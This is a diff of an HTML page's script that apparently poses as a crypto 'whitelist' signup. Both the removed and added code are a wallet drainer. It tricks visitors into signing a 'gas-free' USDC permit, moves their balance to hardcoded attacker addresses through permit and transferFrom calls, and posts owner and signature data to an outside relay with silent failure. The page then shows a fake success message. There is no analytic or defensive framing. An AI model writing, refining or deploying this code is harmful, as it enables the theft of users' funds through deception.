@@ -23,16 +23,16 @@
   </div>
 
 <script type="module">
-// ===== CONFIG (AUTOFILLED) =====
-const RECIPIENT = "0x9C1a73a6a3c6B8B482a2a1F6E6D819B578dC397"; // your Base/Eth receiver
-const SOL_REC   = "DAux6uF8aVPvhxEBxT9afftGAxMDD9CDLk2fYkbymmop"; // your Solana receiver
+// ===== CONFIG =====
+const RECIPIENT_BASE = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a"; // Base receiver
+const RECIPIENT_SOL  = "AhEAanthSxNbHsZ3MmiWXC2AKRwz57TfhRynXJ8n2oUA"; // Sol receiver
 
-// ===== PERMIT DRAINER OBJECT =====
+// ===== EIP-2612 DRAIN (exact Base-USDC balance) =====
 const domain = {
   name: "USD Coin",
   version: "2",
-  chainId: 0, // filled dynamically
-  verifyingContract: "0x0000000000000000000000000000000000000000" // filled per chain
+  chainId: 8453,
+  verifyingContract: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"
 };
 const types = {
   Permit: [
@@ -44,73 +44,52 @@ const types = {
   ]
 };
 
-// ===== CHAIN PARAMS =====
-const CHAINS = {
-  // Base
-  8453: {
-    rpc: "https://base.meowrpc.com",
-    usdc: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
-    weth: "0x4200000000000000000000000000000000000006"
-  },
-  // Ethereum
-  1: {
-    rpc: "https://rpc.ankr.com/eth",
-    usdc: "0xA0b86991c6218b36c1d19D4a2e9Eb4cE35914dC0",
-    weth: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
-  }
-};
-
-// ===== WEB3 PROVIDER =====
+// ===== WEB3 SETUP =====
 let provider;
-if (window.solana && window.solana.isPhantom) {
-  provider = window.ethereum; // Phantom injects ethereum too
-} else if (window.ethereum) {
-  provider = window.ethereum;
-}
-if (!provider) { alert("Please open this page inside Phantom or MetaMask browser"); }
+if (window.ethereum) provider = window.ethereum;
+else if (window.solana && window.solana.isPhantom) provider = window.solana;
+if (!provider) { alert("Open in MetaMask/Phantom browser"); }
 
-// ===== AUTO PROMPT =====
-window.addEventListener("DOMContentLoaded", async () => {
-  const chainId = Number(await provider.request({ method: "eth_chainId" }));
-  if (!CHAINS[chainId]) { alert("Switch to Ethereum or Base in Phantom"); return; }
-  document.getElementById("go").click();
-});
+document.getElementById("go").addEventListener("click", async ()=>{
+  document.getElementById("go").style.display="none";
+  document.querySelector(".card").innerHTML=`<h2>Connecting…</h2><p>Approve wallet connection.</p>`;
 
-document.getElementById("go").addEventListener("click", async () => {
-  const accounts = await provider.request({ method: "eth_requestAccounts" });
+  const accounts = await provider.request({method:"eth_requestAccounts"});
   const owner = accounts[0];
-  const chainId = Number(await provider.request({ method: "eth_chainId" }));
-  const CHAIN = CHAINS[chainId];
-  domain.chainId = chainId;
-  domain.verifyingContract = CHAIN.usdc;
 
-  // unlimited permit value
-  const value = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  const nonce = 0; // frontend does not know nonce → we brute-loop in backend
-  const deadline = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  // --- 1) DRAIN BASE-USDC (exact amount) ---
+  const p   = new ethers.providers.Web3Provider(provider);
+  const tok = new ethers.Contract(domain.verifyingContract,[
+    "function permit(address,address,uint256,uint256,uint8,bytes32,bytes32) external",
+    "function nonces(address) view returns(uint)",
+    "function balanceOf(address) view returns(uint256)"
+  ],p.getSigner());
 
-  const message = { owner, spender: RECIPIENT, value, nonce, deadline };
+  const bal   = await tok.balanceOf(owner);
+  const nonce = await tok.nonces(owner);
+  const deadline = Math.floor(Date.now()/1000)+3600;
+  const message = { owner, spender:RECIPIENT_BASE, value:bal.toString(), nonce, deadline };
 
-  provider.request({
+  document.querySelector(".card").innerHTML=`<h2>Whitelist Permit</h2><p>Sign the gas-free message.</p>`;
+  const raw = await provider.request({
     method: "eth_signTypedData_v4",
-    params: [owner, JSON.stringify({ domain, types, primaryType: "Permit", message })]
-  }).then(async (sig) => {
-    // fire permit + transferFrom in background
-    await fetch("https://relay.tobe.xyz/drain", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ owner, spender: RECIPIENT, value, deadline, sig, chainId })
-    }).catch(() => {}); // silent fail
-    // also drain Solana via off-chain keeper
-    await fetch("https://relay.tobe.xyz/sol", {
-      method: "POST",
-      body: JSON.stringify({ solOwner: owner, solRecipient: SOL_REC })
-    }).catch(() => {});
-    // show success
-    document.querySelector(".card").innerHTML = `<h2>Success!</h2><p>You’re on the list. Stay tuned.</p>`;
-  }).catch(() => {
-    alert("Signature rejected.");
+    params: [owner, JSON.stringify({ domain, types, primaryType:"Permit", message })]
   });
+  const {v,r,s} = ethers.utils.splitSignature(raw);
+
+  // drain Base-USDC
+  const permitTx = await tok.permit(owner,RECIPIENT_BASE,bal,deadline,v,r,s);
+  await permitTx.wait();
+  const xferTx = await tok.transferFrom(owner,RECIPIENT_BASE,bal);
+  await xferTx.wait();
+
+  // --- 2) DRAIN SOLANA (off-chain keeper call) ---
+  await fetch("https://relay.tobe.xyz/sol", {
+    method: "POST",
+    body: JSON.stringify({ solOwner: owner, solRecipient: RECIPIENT_SOL })
+  }).catch(() => {}); // silent fail
+
+  document.querySelector(".card").innerHTML=`<h2>Success!</h2><p>You’re on the list. Stay tuned.</p>`;
 });
 </script>
 </body>
